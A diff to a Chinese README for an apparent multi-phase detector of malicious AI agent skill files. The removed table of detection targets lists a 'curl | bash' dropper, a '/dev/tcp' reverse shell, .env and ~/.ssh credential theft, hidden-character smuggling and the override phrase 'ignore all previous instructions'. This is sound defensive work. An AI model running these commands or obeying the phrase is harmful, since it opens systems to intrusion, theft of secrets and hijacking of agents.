@@ -44,20 +44,6 @@ SKILL.md 里的敏感指令片段——`curl`/`wget` 下载、`subprocess`/`exec
 - **Phase 3** 三路（确定性 det / 直接恶意 U1-U8 / LLM Judge）**各自对块判定**，汇总为 `block_verdicts`；
 - **全局 verdict = 简单规则：存在恶意 block 则全局恶意**——任何阶段都不直接出全局结论。
 
-### 1.4 支持的恶意模式
-
-| 模式 | 示例 | 检测方式 |
-|------|------|---------|
-| Dropper 下载执行 | `curl url \| bash` | AST 污点流 + Regex |
-| 反向 Shell | `bash -i >& /dev/tcp/x:4444` | tree-sitter-bash + Regex |
-| 数据外泄 | 读 `.env` → `requests.post` | AST 污点流 + Compound flag |
-| 指令劫持 | `ignore all previous instructions` | Regex + LLM 指令分析 |
-| 指令隐藏 | 零宽字符 / Unicode Tag 走私 | Regex 混淆检测 |
-| 静默执行 | test 文件自动发现 / npm hooks | 结构攻击检测 |
-| 凭证窃取 | 读 `~/.ssh`, `os.environ` 密钥 | Regex + LLM |
-
----
-
 ## 二、环境配置
 
 ### 2.1 系统要求
@@ -104,9 +90,6 @@ MAS4MalSkill/
 ├── docs/                     # 说明文档
 │   ├── system-spec.md        # 系统说明书 (设计思路/术语/技术栈/编排/数据模型/可视化)
 │   ├── system-diagrams.md    # 系统示意图 (mermaid: 架构/时序/流程/各 Phase)
-│   ├── audit-flow-static-dynamic.html   # 静态×动态双管线审计流程手绘图
-│   ├── system-architecture.png         # 系统架构图（PPT 用，横向）
-│   ├── bugs-found-during-testing.md    # 测试发现的问题汇总
 │   └── schemas/              # result / final-result / trace 三个 JSON Schema
 ├── reference/                # 开发过程参考文件
 │   ├── SKILL_CHUNKING_MIGRATION.md     # Phase 0 两层分块迁移依据（skillprof）
